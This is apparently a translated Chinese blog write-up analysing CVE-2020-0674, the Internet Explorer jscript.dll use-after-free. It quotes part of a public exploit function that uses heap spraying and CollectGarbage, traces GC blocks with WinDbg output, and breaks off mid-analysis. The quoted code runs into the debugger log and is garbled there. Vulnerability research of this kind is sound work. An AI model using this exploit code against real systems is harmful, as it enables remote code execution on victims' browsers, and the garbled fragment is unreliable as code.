# CVE-2020-0674的分析与移植记录
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 背景
CVE-2020-0674是被APT组织Darkhotel所利用的一个漏洞，完整的APT分析可以阅读360
核心安全技术博客上的[一篇文章](https://blogs.360.cn/post/apt-c-06_0day.html)。F-secure的研究员maxpl0it在[Github](https://github.com/maxpl0it/CVE-2020-0674-Exploit)上公开了一份针对win7
x64的poc，在分析过CVE-2017-11907和CVE-2018-8353后，笔者对jscript.dll模块中已经比较熟悉，这里尝试对CVE-2020-0674漏洞进行分析并在win7
x86上复现RCE。
## 漏洞原理
Github上提供的样本可读性非常好，根据maxpl0it的注释，很容易就定位到漏洞触发的函数
    // initial_exploit: The main exploit function.
    function initial_exploit(untracked_1, untracked_2) {
        untracked_1 = spray[depth*2];
        untracked_2 = spray[depth*2 + 1];
        if(depth > 150) {
            spray = new Array(); // Erase spray
            CollectGarbage(); // Add to free
            for(i = 0; i  ?jscript!NameTbl::`vftable'
    Evaluate expression: 1809127752 = 6bd51948
    // 通过搜索虚表找到Object
    0:016> s -d 0x0 L?0x7fffffff 6bd51948
    02b3e458  6bd51948 00000000 02b3daa0 02b3cdd8  H..k............
    6bd55a2c  6bd51948 0244838b 07c70000 6bd55b20  H..k..D..... [.k
    6bd56470  6bd51948 0f045e39 044d2d8f 084e8b00  H..k9^...-M...N.
    6bd5717c  6bd51948 000057e8 30acb900 c38b6bdd  H..k.W.....0.k..
    0:016> dd 02b3daa0
    02b3daa0  6bd51924 00000001 00000001 02b3db10
    02b3dab0  0000003c 00000100 00000100 00004000
    02b3dac0  02b3db14 02b3db34 02b3fd20 0000000f
    0:016> dd 02b3db14 
    02b3db14  00000003 00000000 00000001 00000000
    02b3db24  00000000 00000000 0007b9e4 00000008
    02b3db34  00000000 00000000 00000001 00000000
    02b3db44  00610061 00610061 00000000 00000000
    0:016> s -d 0x0 L?0x7fffffff 02b3e458
    02b3d728  02b3e458 00000000 00000081 00000000  X...............
    //找到Gcblock
    0:016> dd 02b3d728 -8 L4 
    02b3d720  00000081 00000000 02b3e458 00000000
    0:016> !heap -p -a 02b3d720  
        address 02b3d720 found in
        _HEAP @ 2e0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            02b3d190 00ca 0000  [00]   02b3d198    00648 - (busy)
    0:016> ba w1 02b3d720 
    0:016> g
    Breakpoint 0 hit
    eax=00000881 ebx=0000008a ecx=02b3d720 edx=00000010 esi=02b3d7e0 edi=02b3d198
    eip=6bd567c0 esp=0571b568 ebp=0571b5a8 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    jscript!GcAlloc::SetMark+0x38:
    6bd567c0 03ca            add     ecx,edx
    0:012> g
    Breakpoint 0 hit
    eax=00000004 ebx=02b3d7e0 ecx=00000081 edx=02b3d170 esi=02b3d720 edi=00000001
    eip=6bd56b66 esp=0571b518 ebp=0571b558 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    jscript!GcAlloc::ReclaimGarbage+0xb1:
    6bd56b66 66394ddc        cmp     word ptr [ebp-24h],cx    ss:0023:0571b534=008a
可以看到，gcblock.mem[k]中的type域只命中了两次硬件写入断点，为GcAlloc::SetMark和GcAlloc::ReclaimGarbage，对应Mark和Reclaim  
类似的，可以得出第二个Object会命中GcAlloc::SetMark和Scavenge
    var a = new Object();
    a['aaaa'] = 1;
因此，上面的代码片段在内存的组织如下所示：
    //硬件断点断在Scavenge